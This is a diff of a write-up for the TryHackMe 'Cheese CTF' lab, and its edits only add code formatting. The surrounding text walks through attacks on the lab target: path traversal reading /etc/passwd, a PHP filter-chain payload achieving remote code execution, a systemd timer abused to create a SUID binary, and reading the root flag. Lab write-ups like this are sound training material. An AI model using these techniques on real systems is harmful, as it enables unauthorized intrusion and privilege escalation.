@@ -10,15 +10,15 @@ Cheese CTF is a Linux-based TryHackMe room that includes web enumeration, authen
 - Capture the root flag
 
 ## Tools Used
-- Nmap
-- ffuf
-- curl
-- php_filter_chain_generator
-- netcat
-- SSH
-- MySQL
-- systemctl
-- xxd
+- `Nmap`
+- `ffuf`
+- `curl`
+- `php_filter_chain_generator`
+- `netcat`
+- `SSH`
+- `MySQL`
+- `systemctl`
+- `xxd`
 
 ## Target Information
 - Target IP: `10.x.x.x`
@@ -97,13 +97,13 @@ The URL looked like this:
 ```text
 http://10.x.x.x/secret-script.php?file=supersecretadminpanel.html
 ```
-Because the application was directly referencing files through a GET parameter, I tested for Local File Inclusion (LFI) by replacing the value with a path traversal sequence targeting /etc/passwd.
+Because the application was directly referencing files through a GET parameter, I tested for Local File Inclusion (LFI) by replacing the value with a path traversal sequence targeting `/etc/passwd`.
 ```text
 http://10.x.x.x/secret-script.php?file=../../../../../../etc/passwd
 ```
 <img width="1912" height="258" alt="lfi-etc-passwd" src="https://github.com/user-attachments/assets/230a0b5a-b200-4717-83b4-40881d36ca48" />
 
-The application returned the contents of /etc/passwd, which confirmed that the file= parameter was vulnerable to Local File Inclusion.
+The application returned the contents of `/etc/passwd`, which confirmed that the `file=` parameter was vulnerable to Local File Inclusion.
 
 This was an important finding because it meant I could read local files from the server and potentially inspect the source code of the vulnerable application.
 
@@ -119,11 +119,11 @@ http://10.x.x.x/secret-script.php?file=php://filter/convert.base64-encode/resour
 ```
 <img width="1570" height="111" alt="php-filter-source-request" src="https://github.com/user-attachments/assets/f447075a-b442-4842-aea4-954cb62357f0" />
 
-The server returned the Base64-encoded contents of secret-script.php, which I then decoded to inspect the source code.
+The server returned the Base64-encoded contents of `secret-script.php`, which I then decoded to inspect the source code.
 
 <img width="1415" height="138" alt="decoded-secret-script-source" src="https://github.com/user-attachments/assets/de5d0956-e6bd-49bd-b1a5-a20a6e251063" />
 
-The code showed that the application directly passed user-controlled input into include($file) without validation or sanitization. This confirmed that the file= parameter was not only vulnerable to file inclusion, but also a likely path toward remote code execution.
+The code showed that the application directly passed user-controlled input into include($file) without validation or sanitization. This confirmed that the `file=` parameter was not only vulnerable to file inclusion, but also a likely path toward remote code execution.
 
 
 ## 5. Remote Code Execution (RCE)
@@ -133,11 +133,11 @@ After reviewing the source code, I confirmed that the application used:
 ```php
 include($file);
 ```
-Because the file parameter was passed directly into include(), I explored whether the LFI could be turned into code execution.
+Because the file parameter was passed directly into `include()`, I explored whether the LFI could be turned into code execution.
 
-A simple data:// wrapper test did not return command output, so I moved to a more advanced technique using php_filter_chain_generator, which can build a filter chain that results in PHP code execution through the vulnerable include() call.
+A simple data:// wrapper test did not return command output, so I moved to a more advanced technique using `php_filter_chain_generator`, which can build a filter chain that results in PHP code execution through the vulnerable `include()` call.
 
-I first cloned the tool and generated a test payload that would run the id command.
+I first cloned the tool and generated a test payload that would run the `id` command.
 
 ```bash
 git clone https://github.com/synacktiv/php_filter_chain_generator.git
@@ -146,7 +146,7 @@ python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
 ```
 <img width="1897" height="583" alt="filter-chain-generator-id" src="https://github.com/user-attachments/assets/23f690ab-dbc1-4ccd-a8cf-f56fa987ed25" />
 
-The tool returned a long php://filter/... payload. I then used that payload in a request to the vulnerable endpoint through the file parameter.
+The tool returned a long `php://filter/...` payload. I then used that payload in a request to the vulnerable endpoint through the file parameter.
 
 ```bash
 payload='php://filter/...'
@@ -156,11 +156,11 @@ curl -G --output - 'http://10.x.x.x/secret-script.php' \
 
 <img width="1908" height="390" alt="rce-id-output" src="https://github.com/user-attachments/assets/e2e0a306-4a56-4beb-8844-397d90271977" />
 
-The response returned the result of the id command:
+The response returned the result of the `id` command:
 
-'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
+`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
 
-This confirmed that I had achieved remote code execution on the target as the www-data user.
+This confirmed that I had achieved remote code execution on the target as the `www-data` user.
 
 
 ## 6. Reverse Shell
@@ -201,7 +201,7 @@ After landing the shell, I confirmed my access level and current working directo
 
 <img width="149" height="91" alt="whoami-pwd" src="https://github.com/user-attachments/assets/7434395a-7df4-4a6f-904a-d126a4c43d2a" />
 
-The shell was running as www-data from /var/www/html, which gave me a stable foothold on the target and allowed me to continue local enumeration.
+The shell was running as `www-data` from /var/www/html, which gave me a stable foothold on the target and allowed me to continue local enumeration.
 
 
 ## 7. Credential Discovery
@@ -220,11 +220,11 @@ $password = "[REDACTED]";
 
 It also revealed additional interesting references, including:
 
-- secret-script.php
+- `secret-script.php`
 
-- supersecretadminpanel.html
+- `supersecretadminpanel.html`
 
-- supersecretmessageforadmin
+- `supersecretmessageforadmin`
 
 These findings suggested that the application stored sensitive information directly in the source code and that the credentials might be useful for further access.
 
@@ -326,9 +326,9 @@ The service file showed the following command:
 
 `ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"`
 
-This meant that if the service ran successfully as root, it would copy xxd to /opt/xxd and set the SUID bit on it.
+This meant that if the service ran successfully as root, it would copy xxd to `/opt/xxd` and set the SUID bit on it.
 
-However, the timer was broken because OnBootSec= was empty. I checked the permissions of the unit files and found that exploit.timer was world-writable.
+However, the timer was broken because `OnBootSec=` was empty. I checked the permissions of the unit files and found that exploit.timer was world-writable.
 
 ```bash
 ls -l /etc/systemd/system/exploit.timer /etc/systemd/system/exploit.service
@@ -359,7 +359,7 @@ ls -l /opt/xxd
 ```
 <img width="510" height="87" alt="trigger-exploit-timer" src="https://github.com/user-attachments/assets/f9b8a3cd-0e2f-4b74-ba05-b9b74d1999db" />
 
-This created /opt/xxd as a SUID binary owned by root.
+This created `/opt/xxd` as a SUID binary owned by root.
 
 
 ## 11. Root Flag
@@ -373,7 +373,7 @@ ls -l /opt/xxd
 ```
 <img width="418" height="39" alt="ls-opt-xxd" src="https://github.com/user-attachments/assets/859b77d1-fb78-4373-aefa-dbf183dd44f5" />
 
-Then I used xxd to read the root flag from `/root/root.txt` and convert it back to plain text:
+Then I used `xxd` to read the root flag from `/root/root.txt` and convert it back to plain text:
 
 ```bash
 /opt/xxd /root/root.txt | /opt/xxd -r
